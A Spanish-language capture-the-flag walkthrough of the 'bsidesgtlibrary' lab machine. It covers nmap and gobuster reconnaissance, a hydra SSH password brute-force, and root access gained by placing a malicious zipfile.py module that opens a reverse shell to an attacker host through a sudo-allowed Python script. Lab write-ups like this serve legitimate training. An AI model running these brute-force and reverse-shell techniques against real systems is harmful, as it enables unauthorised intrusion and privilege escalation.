# bsidesgtlibrary

## Recon 
```bash
silent-scan $TARGET
nmap -sVC -p $TARGET -oN service
```
**Output**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Welcome to  Blog - Library Machine
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/
```


## En la  pagina principal vemos 3 usuarios root , www-data y Anonymous que son 3 pisbles usuarios de el host victima 

## Fuzz 
```bash
gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak,old,sql,log,conf,ini -t 50
```

**Output**
```
images               (Status: 301) [Size: 317] [--> http://10.130.140.237/images/]
index.html           (Status: 200) [Size: 5439]
index.html           (Status: 200) [Size: 5439]
robots.txt           (Status: 200) [Size: 33]
robots.txt           (Status: 200) [Size: 33]
```

___

### Navegamos a robots.txt
**Output**
```
User-agent: rockyou 
Disallow: /
```

### HMM si tenemos 1 posible usuario por ssh podremos obtener acceso al host on fuerza bruta

```bash
hydra -L meliodas -P /usr/share/wordlists/rockyou.txt ssh://$TARGET -t 4 -V 
```

**Output**
```
[22][ssh] host: 10.130.140.237   login: meliodas   password: iloveyou1
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-23 12:11:20
```
### Tenemos aceso ssh 
### Enumeramos 
```bash
ls 
ls -lha
cat user.txt
sudo -l
```

**Output**
```
meliodas@ubuntu:~$ cat bak.py 
#!/usr/bin/env python
import os
import zipfile

def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))

if __name__ == '__main__':
    zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
    zipdir('/var/www/html', zipf)
    zipf.close()

User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
```

### La variable apth apunta primero a el home de melodias podemos crear una libreria falsa de python parqa que el script importe le modulo malicioso
```bash
echo $PATH
```
### Creamos modulo malicioso zipfile.py
```python
import os
import pty
import socket

lhost = "$LHOST"
lport = 1337

ZIP_DEFLATED = 0

class ZipFile:
    def close(*args):
        return

    def write(*args):
        return

    def __init__(self, *args):
        return

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((lhost, lport))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
os.putenv("HISTFILE",'/dev/null')
pty.spawn("/bin/bash")
s.close()
```

### Ejecutamos
```bash
sudo /usr/bin/python /home/meliodas/bak.py
whoami 
cat /root/root.txt
```

---

## Related Notes
- [nmap](../../../tools/recon/nmap.md)
- [gobuster](../../../tools/fuzz/gobuster.md)
- [hydra](../../../tools/creds/hydra.md)
- [python-library-hijack](../../../privesc/linux/python-library-hijack.md)
